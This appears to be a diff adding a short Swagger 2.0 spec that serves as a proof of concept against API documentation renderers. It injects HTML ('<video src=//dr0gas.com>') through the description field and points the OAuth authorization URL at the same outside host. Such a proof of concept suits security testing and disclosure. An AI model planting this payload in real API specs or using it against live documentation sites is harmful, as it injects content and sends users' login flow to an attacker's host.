@@ -1,0 +1,15 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: http://dr0gas.com
+info:
+  version: "0.0.1"
+  title: dr0gas POC arbitrary text
+  description: Please Authorize!<video src=//dr0gas.com>
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful respons
